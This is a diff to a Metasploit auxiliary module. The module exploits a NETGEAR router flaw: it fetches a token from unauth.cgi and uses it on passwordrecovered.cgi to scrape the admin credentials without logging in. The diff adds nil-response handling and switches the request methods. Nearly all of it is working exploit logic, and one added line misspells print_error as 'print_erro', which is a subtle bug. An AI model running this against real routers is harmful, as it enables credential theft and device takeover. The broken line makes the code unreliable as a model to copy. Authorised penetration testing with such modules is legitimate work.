@@ -59,7 +59,12 @@ class MetasploitModule < Msf::Auxiliary
     # will always call check no matter what
     is_ng = check
 
-    res = send_request_raw({ 'uri' => '/'})
+    res = send_request_cgi({ 'uri' => uri })
+    
+    if res.nil?
+      print_error("#{rhost} returned an empty response.")
+      return
+    end
 
     if is_ng == Exploit::CheckCode::Detected
       marker_one = "id="
@@ -71,7 +76,7 @@ class MetasploitModule < Msf::Auxiliary
       end
       print_status("Token found: #{token}")
       vprint_status("Token found at #{rhost}/unauth.cgi?id=#{token}")
-      r = send_request_raw({'uri' => "/passwordrecovered.cgi?id=#{token}"})
+      r = send_request_cgi({'uri' => "/passwordrecovered.cgi?id=#{token}"})
       vprint_status("Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}")
       if r.to_s.include?('left">')
         username = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Username</td><td class=\"MNUText\" align=\"left\">", "</td>")
@@ -98,17 +103,22 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Connection timed out.')
     end
 
-    data = res.to_s
-    # Checks for the `WWW-Authenticate` header in the response
-    if data.include? "WWW-Authenticate"
-      marker_one = "Basic realm=\""
-      marker_two = "\""
-      model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
-      print_good("Router is a NETGEAR router (#{model})")
-      return Exploit::CheckCode::Detected
+    if res.nil?
+      print_erro("#{rhost} returned an empty response")
+      return
     else
-      print_error('Router is not a NETGEAR router')
-      return Exploit::CheckCode::Safe
+      data = res.to_s
+      # Checks for the `WWW-Authenticate` header in the response
+      if data.include? "WWW-Authenticate"
+        marker_one = "Basic realm=\""
+        marker_two = "\""
+        model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
+        print_good("Router is a NETGEAR router (#{model})")
+        return Exploit::CheckCode::Detected
+      else
+        print_error('Router is not a NETGEAR router')
+        return Exploit::CheckCode::Safe
+      end
     end
   end
 end
